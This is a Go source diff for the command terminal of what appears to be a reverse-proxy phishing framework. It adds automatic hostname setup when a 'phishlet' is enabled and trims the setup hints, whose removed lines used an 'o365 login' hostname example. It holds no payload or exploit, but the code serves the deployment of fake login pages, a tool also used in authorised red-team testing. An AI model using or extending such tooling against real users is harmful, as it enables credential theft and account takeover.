@@ -1254,6 +1254,30 @@ func (t *Terminal) handlePhishlets(args []string) error {
 			if pl.isTemplate {
 				return fmt.Errorf("phishlet '%s' is a template - you have to 'create' child phishlet from it, with predefined parameters, before you can enable it.", args[1])
 			}
+
+			// Auto-set hostname if not already configured
+			if h, ok := t.cfg.GetSiteDomain(args[1]); !ok || h == "" {
+				baseDomain := t.cfg.GetBaseDomain()
+				if baseDomain == "" {
+					return fmt.Errorf("set your base domain first: config domain <yourdomain.com>")
+				}
+				// Find the landing proxy host's phish_sub to build the hostname
+				landingSub := ""
+				for _, ph := range pl.proxyHosts {
+					if ph.is_landing {
+						landingSub = ph.phish_subdomain
+						break
+					}
+				}
+				if landingSub != "" {
+					autoHostname := landingSub + "." + baseDomain
+					log.Info("auto-setting hostname: %s", autoHostname)
+					t.cfg.SetSiteHostname(args[1], autoHostname)
+				} else {
+					t.cfg.SetSiteHostname(args[1], baseDomain)
+				}
+			}
+
 			err = t.cfg.SetSiteEnabled(args[1])
 			if err != nil {
 				t.cfg.SetSiteDisabled(args[1])
@@ -2072,20 +2096,9 @@ func (t *Terminal) checkStatus() {
 	}
 
 	if enabledCount == 0 {
-		// Check if any phishlet has a hostname set
-		hasHostname := false
-		for _, name := range t.cfg.GetPhishletNames() {
-			if h, ok := t.cfg.GetSiteDomain(name); ok && h != "" {
-				hasHostname = true
-				break
-			}
-		}
-		if !hasHostname {
-			log.Info("%s  %s", dgray.Sprint("step 3 →"), cyan.Sprint("phishlets hostname <name> <hostname>"))
-			log.Info("%s  example: %s", dgray.Sprint("       "), cyan.Sprint("phishlets hostname o365 login."+t.cfg.GetBaseDomain()))
-		}
-		log.Info("%s  %s", dgray.Sprint("step 4 →"), cyan.Sprint("phishlets enable <name>"))
+		log.Info("%s  %s", dgray.Sprint("step 3 →"), cyan.Sprint("phishlets enable <name>"))
 		log.Info("%s  run %s to see available phishlets", dgray.Sprint("       "), cyan.Sprint("phishlets"))
+		log.Info("%s  hostname is auto-set from your domain (%s)", dgray.Sprint("       "), yellow.Sprint(t.cfg.GetBaseDomain()))
 		return
 	}
 
